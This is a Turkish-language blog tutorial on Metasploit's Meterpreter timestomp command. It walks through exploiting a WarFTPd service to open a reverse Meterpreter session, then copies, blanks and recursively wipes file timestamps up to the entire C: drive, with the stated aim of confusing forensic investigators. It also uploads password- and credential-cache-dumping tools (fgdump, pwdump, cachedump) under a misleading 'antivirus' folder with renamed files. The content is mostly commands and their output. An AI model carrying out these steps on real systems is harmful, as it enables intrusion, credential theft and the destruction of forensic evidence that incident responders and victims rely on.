---
draft: false

title:  'MSF Timestomp'
date: '2017-06-05T13:37:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  "Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek\_forensics\_araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter\_timestomp\_adı verilen bir komut sağlamaktadır." 
 
url:  /tr/msf-timestomp/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---
## TimeStomp Nedir?

Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter `timestomp` adı verilen bir komut sağlamaktadır.

İz bırakmamanın en iyi yolu sisteme hiç dokunmamaktır. Meterpreter, normal olarak RAM üzerinde çalışır ve diske dokunmaz. Fakat gerçekleştireceğiniz bir takım dosya işlemleri sonucunda ister istemez zaman logları oluşacaktır. Bu yazımızda dosyaların zaman kayıtları üzerinde `timestomp` komutu kullanılarak oynama yapmayı göreceğiz.

Her dosyanın Windows için Modified, Accesed ve Changed olarak 3 farklı zaman kaydı tutulur. Bunlara baş harflerinden hareetle kısaca MAC zamanları diyebiliriz. Ağ kartının MAC adresi ile karıştırmayın.

Windows içerisinde bir dosyanın MAC zamanlarına bakalım.
```bash
File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
Created Date: 5/3/2009 2:30:08 AM
Last Accessed: 5/3/2009 2:31:39 AM
Last Modified: 5/3/2009 2:30:36 AM
```

Yukarıda, `test.txt` isimli dosyanın zaman kayıtlarını görebiliriz. Şimdi, `warftpd_165_user` modülünü kullanarak bu sistemde `Meterpreter` oturum açtığımızı farz edelim.
```bash
msf exploit(warftpd_165_user) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Connecting to FTP server 172.16.104.145:21...
> Connected to target FTP server.
> Trying target Windows 2000 SP0-SP4 English...
> Transmitting intermediate stager for **over-sized stage...(191 bytes)
> Sending stage (2650 bytes)
> Sleeping before handling stage...
> Uploading DLL (75787 bytes)...
> Upload completed.
> meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1218)
meterpreter > use priv
Loading extension priv...success.
```

Meterpreter shell açıldıktan sonra `timestomp -h` komutu ile yardım bilgilerini görüntüleyebilirsiniz.
```bash
meterpreter > timestomp -h

Usage: timestomp OPTIONS file_path

OPTIONS:

    -a   Set the "last accessed" time of the file
    -b        Set the MACE timestamps so that EnCase shows blanks
    -c   Set the "creation" time of the file
    -e   Set the "mft entry modified" time of the file
    -f   Set the MACE of attributes equal to the supplied file
    -h        Help banner
    -m   Set the "last written" time of the file
    -r        Set the MACE timestamps recursively on a directory
    -v        Display the UTC MACE values of the file
    -z   Set all four attributes (MACE) of the file
```

Şimdi, yukarıda örneğini verdiğimiz `test.txt` dosyasının bulunduğu klasöre gidelim.
```bash
meterpreter > pwd
C:\Program Files\War-ftpd
meterpreter > cd ..
meterpreter > pwd
C:Program Files
meterpreter > cd ..
meterpreter > cd Documents\ and\ Settings
meterpreter > cd P0WN3D
meterpreter > cd My\ Documents
meterpreter > ls

Listing: C:\Documents and Settings\P0WN3D\My Documents
**======================================================**

Mode              Size  Type  Last modified                   Name        
----              ----  ----  -------------                   ----        
40777/rwxrwxrwx   0     dir   Wed Dec 31 19:00:00 -0500 1969  .           
40777/rwxrwxrwx   0     dir   Wed Dec 31 19:00:00 -0500 1969  ..          
40555/r-xr-xr-x   0     dir   Wed Dec 31 19:00:00 -0500 1969  My Pictures 
100666/rw-rw-rw-  28    fil   Wed Dec 31 19:00:00 -0500 1969  test.txt
```

Bulunduğumuz klasördeki `test.txt` dosyasının zaman bilgilerini `-v` seçeneği ile görüntüleyebilirsiniz.
```bash
meterpreter > timestomp test.txt -v
Modified      : Sun May 03 04:30:36 -0400 2009
Accessed      : Sun May 03 04:31:51 -0400 2009
Created       : Sun May 03 04:30:08 -0400 2009
Entry Modified: Sun May 03 04:31:44 -0400 2009
```

Bu dosyayı sizin oluşturduğunuzu düşünün. Bunu değiştirmek isteyebilirsiniz. Şimdi bu zaman bilgilerini değiştirmeye çalışalım. Bunu yapmanın birinci yolu, sistemde bulunan başka bir dosyanın zaman bilgilerini, `test.txt` dosyasına kopyalakmatır.

Örneğin, `cmd.exe` dosyasının zaman bilgilerini `test.txt` zaman bilgilerine kopyalayalım. Bunun için aşağıdaki komutu `-f` seçeneği ile yürütebilirsiniz.
```bash
meterpreter > timestomp test.txt -f C:\\WINNT\\system32\\cmd.exe
> Setting MACE attributes on test.txt from C:\WINNT\system32\cmd.exe
meterpreter > timestomp test.txt -v
Modified      : Tue Dec 07 08:00:00 -0500 1999
Accessed      : Sun May 03 05:14:51 -0400 2009
Created       : Tue Dec 07 08:00:00 -0500 1999
Entry Modified: Sun May 03 05:11:16 -0400 2009
```

İşlem tamamlandı. Gerçekten kopyalanmış mı bakalım.
```bash
File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
Created Date: 12/7/1999 7:00:00 AM
Last Accessed: 5/3/2009 3:11:16 AM
Last Modified: 12/7/1999 7:00:00 AM
```

Gördüğünüz gibi `test.txt` dosyasının MAC zaman bilgileri `cmd.exe` dosyasıyla aynı oldu.

Dikkatli bir kullanıcıysanız, Windows komut satırından ve Linux komut satırından dosyaya baktığınızda tarih bilgileri aynı olsa da saat bilgilerinin farklı olduğunu fark etmişsinizdir. Bu farkın sebebi `timezone` zaman dilimlerinin farklılığındandır.

Ayıca, `test.txt` dosyasının `accessed time` değerinin dosyanın bilgilerini kontrol ettiğimizden dolayı hemen yeni tarihe güncellendiğini de vurgulamak gerekir. Windows için zaman kayıtlarının ne kadar değişken ve önemli olduğunu vurgulamak yerinde olacaktır.

Şimdi farklı bir teknik kullanalım. `timestomp` sunduğu `-b` seçeneği, zaman bilgilerini boş olarak ayarlamanıza yardımcı olur. Aşağıdaki örnekte, dosyanın mevcut durumu ve `timestomp test.txt -b` komutu sonrasındaki zaman bilgilerini görebilirsiniz.
```bash
meterpreter > timestomp test.txt -v
Modified      : Tue Dec 07 08:00:00 -0500 1999
Accessed      : Sun May 03 05:16:20 -0400 2009
Created       : Tue Dec 07 08:00:00 -0500 1999
Entry Modified: Sun May 03 05:11:16 -0400 2009

meterpreter > timestomp test.txt -b
> Blanking file MACE attributes on test.txt
meterpreter > timestomp test.txt -v
Modified      : 2106-02-06 23:28:15 -0700
Accessed      : 2106-02-06 23:28:15 -0700
Created       : 2106-02-06 23:28:15 -0700
Entry Modified: 2106-02-06 23:28:15 -0700
```

Görüldüğü gibi dosyalar 2106 yılına ait zaman bilgilerini aldı. Bu görünüm Meterpreter komut satırından böyle iken bir de Windows içerisinde nasıl göründüğüne bakalım.
```bash
File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
Created Date: 1/1/1601
Last Accessed: 5/3/2009 3:21:13 AM
Last Modified: 1/1/1601
```

Linux Meterpreter içerisinde 2106 yılı, Windows içinde 1601 oarak görülmektedir. Bu farkın sebebini <a href="http://en.wikipedia.org/wiki/1601#Notes">Ek bilgi</a> sayfasından inceleyebilirsiniz.

## Başka Bir Örnek

Şimdi, meterpreter komut satırımızdan Windows içerisine `WINNT\\antivirus\\` klasörü oluşturalım ve içerisine bir kaç dosya yükleyelim.
```bash
meterpreter > cd C:\\WINNT
meterpreter > mkdir antivirus
Creating directory: antivirus
meterpreter > cd antivirus
meterpreter > pwd
C:\WINNT\antivirus
meterpreter > upload /usr/share/windows-binaries/fgdump c:\\WINNT\\antivirus\\
> uploading  : /usr/share/windows-binaries/fgdump/servpw.exe -> c:WINNTantivirusPwDump.exe
> uploaded   : /usr/share/windows-binaries/fgdump/servpw.exe -> c:WINNTantivirusPwDump.exe
> uploading  : /usr/share/windows-binaries/fgdump/cachedump64.exe -> c:WINNTantivirusLsaExt.dll
> uploaded   : /usr/share/windows-binaries/fgdump/cachedump64.exe -> c:WINNTantivirusLsaExt.dll
> uploading  : /usr/share/windows-binaries/fgdump/pstgdump.exe -> c:WINNTantiviruspwservice.exe
> uploaded   : /usr/share/windows-binaries/fgdump/pstgdump.exe -> c:WINNTantiviruspwservice.exe
meterpreter > ls

Listing: C:\WINNT\antivirus
**===========================**

Mode              Size    Type  Last modified                   Name          
----              ----    ----  -------------                   ----          
100777/rwxrwxrwx  174080  fil   2017-05-09 15:23:19 -0600  cachedump64.exe
100777/rwxrwxrwx  57344   fil   2017-05-09 15:23:20 -0600  pstgdump.exe
100777/rwxrwxrwx  57344   fil   2017-05-09 15:23:18 -0600  servpw.exe
meterpreter > cd ..
```

Artık Windows içerisine `antivirus` klasörünün içerisine yüklediğimiz 3 adet `exe` dosyamız var. Bunların zaman bilgilerine bakalım.
```bash
meterpreter > timestomp antivirus\\servpw.exe -v
Modified      : 2017-05-09 16:23:18 -0600
Accessed      : 2017-05-09 16:23:18 -0600
Created       : 2017-05-09 16:23:18 -0600
Entry Modified: 2017-05-09 16:23:18 -0600
meterpreter > timestomp antivirus\\pstgdump.exe -v
Modified      : 2017-05-09 16:23:20 -0600
Accessed      : 2017-05-09 16:23:19 -0600
Created       : 2017-05-09 16:23:19 -0600
Entry Modified: 2017-05-09 16:23:20 -0600
```

`timestomp` komutunun `-r` seçeneğini kullanarak tüm klasör içeriğindeki dosyaların zaman bilgilerini boşaltabilirsiniz.
```bash
meterpreter > timestomp antivirus -r
> Blanking directory MACE attributes on antivirus

meterpreter > ls
40777/rwxrwxrwx   0      dir   1980-01-01 00:00:00 -0700  ..
100666/rw-rw-rw-  115    fil   2106-02-06 23:28:15 -0700  servpw.exe
100666/rw-rw-rw-  12165  fil   2106-02-06 23:28:15 -0700  pstgdump.exe
```

Yukarıda anlatılan yöntemlerle zaman bilgilerini değiştirdik veya boş hale getirdik ancak dikkatli forensics** araştırmacıları bu garipliği fark edecektir.

Bunun yerine sistemin tamamının zaman bilgilerini değiştirmeyi düşünebilirsiniz. Bu durumda, hangi dosyanın ne zaman oluşturulduğu veya değiştirildiği tamamen karışacaktır. Karşılaştırma yapılacak başka bir dosya olmadığından işler iyice karmaşık hale gelecektir.

Bu durum, sisteme bir müdahale olduğunu açık olarak ortaya koymakla birlikte forensics** araştırmacılarının işini zorlaştıracaktır.

## Tüm Sistemin Zaman Bilgilerini Değiştirme
```bash
meterpreter > pwd
C:WINNT\antivirus
meterpreter > cd ../..
meterpreter > pwd
C:
meterpreter > ls

Listing: C:\
**============**

Mode              Size       Type  Last modified                   Name                      
----              ----       ----  -------------                   ----                      
100777/rwxrwxrwx  0          fil   Wed Dec 31 19:00:00 -0500 1969  AUTOEXEC.BAT              
100666/rw-rw-rw-  0          fil   Wed Dec 31 19:00:00 -0500 1969  CONFIG.SYS                
40777/rwxrwxrwx   0          dir    Wed Dec 31 19:00:00 -0500 1969  Documents and Settings    
100444/r--r--r--  0          fil   Wed Dec 31 19:00:00 -0500 1969  IO.SYS                    
100444/r--r--r--  0          fil   Wed Dec 31 19:00:00 -0500 1969  MSDOS.SYS                 
100555/r-xr-xr-x  34468      fil   Wed Dec 31 19:00:00 -0500 1969  <a href="http://ntdetect.com/">NTDETECT.COM</a>              
40555/r-xr-xr-x   0          dir   Wed Dec 31 19:00:00 -0500 1969  Program Files             
40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  RECYCLER                  
40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  System Volume Information 
40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  WINNT                     
100555/r-xr-xr-x  148992     fil   Wed Dec 31 19:00:00 -0500 1969  arcldr.exe                
100555/r-xr-xr-x  162816     fil   Wed Dec 31 19:00:00 -0500 1969  arcsetup.exe              
100666/rw-rw-rw-  192        fil   Wed Dec 31 19:00:00 -0500 1969  boot.ini                  
100444/r--r--r--  214416     fil   Wed Dec 31 19:00:00 -0500 1969  ntldr                     
100666/rw-rw-rw-  402653184  fil   Wed Dec 31 19:00:00 -0500 1969  pagefile.sys              

meterpreter > timestomp C:\\ -r
> Blanking directory MACE attributes on C:\
meterpreter > ls
meterpreter > ls

Listing: C:\
**============**

Mode              Size       Type  Last modified              Name
----              ----       ----  -------------              ----
100777/rwxrwxrwx  0          fil   2106-02-06 23:28:15 -0700  AUTOEXEC.BAT
100666/rw-rw-rw-  0          fil   2106-02-06 23:28:15 -0700  CONFIG.SYS
100666/rw-rw-rw-  0          fil   2106-02-06 23:28:15 -0700  Documents and Settings
100444/r--r--r--  0          fil   2106-02-06 23:28:15 -0700  IO.SYS
100444/r--r--r--  0          fil   2106-02-06 23:28:15 -0700  MSDOS.SYS
100555/r-xr-xr-x  47564      fil   2106-02-06 23:28:15 -0700  <a href="http://ntdetect.com/">NTDETECT.COM</a>
...snip...
```

`timestomp C:\\ -r` komutuyla C diskinde bulunan tüm dosyaların zaman bilgilerinin değiştirildiğini görebilirsiniz.

Akıllı forensics** araştırmacıları, sadece zaman bilgileri değil başka yerlere de bakarlar. Windows içinde çeşitli farklı kayıt mekanizmaları bulunmaktadır.
